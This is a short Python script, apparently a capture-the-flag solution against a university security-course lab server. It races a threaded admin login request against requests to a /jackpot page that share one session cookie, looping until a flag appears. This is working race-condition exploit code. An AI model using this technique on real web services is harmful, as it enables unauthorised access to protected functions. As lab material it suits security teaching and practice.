import requests
import time
import threading
import re

baseurl = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22652"

cookie = {"JTOKEN": "9cc7cbbf164298bfb28a174abea5391c860f5eb574303bbd6a545f384b561b35ada67536c15370787ff01b42aec170a47b6bc9412211577e70a63f9f856f91c4"}

def login():
    r = requests.post(f"{baseurl}/login", data={"username": "admin", "password": "1"}, cookies=cookie)
    print(f"join: {r.status_code}")

def jackpot():
    r2 = requests.get(f"{baseurl}/jackpot", cookies=cookie)
    print(f"jackpot: {r2.status_code}")
    res = re.search(r"<h1>.*</h1>", r2.text)
    if res: 
        print(res.group())
        if "SSof" in res.group():
            exit()
    if "SSof{" in r2.text:
        print(r2.text)
        exit()


while True:
    # creating thread
    t1 = threading.Thread(target=login)
    t2 = threading.Thread(target=jackpot)
 
    # starting thread 1
    t1.start()
    # starting thread 2
    t2.start()
 
    # wait until thread 1 is completely executed
    t1.join()
    # wait until thread 2 is completely executed
    t2.join()

    time.sleep(2)
    

